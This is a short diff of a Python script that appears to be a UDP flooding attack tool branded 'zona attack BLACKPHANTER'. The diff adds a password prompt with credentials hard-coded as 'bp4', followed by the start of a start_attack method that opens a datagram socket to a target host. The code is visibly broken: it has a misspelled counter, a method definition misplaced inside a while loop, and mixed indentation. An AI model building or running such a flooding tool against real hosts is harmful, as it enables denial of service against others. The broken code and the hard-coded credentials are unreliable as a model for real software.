@@ -28,6 +28,18 @@ for line in header_lines:
     print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://kunkaffa@gmail.com")
     print(f"{Fore.CYAN}|{'=' * 74}|")
 
+while attemps < 100:
+    username = input("\033[32mEnter your username: \033[0m")
+    password = input("\033[31mEnter your password: \033[0m")
+
+    if username == 'bp4' and password == 'bp4':
+        print("\033[32m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
+        break
+    else:
+        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        attemps += 1
+        continue
+		
     def start_attack(self,host,port=None):
 		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 		try:
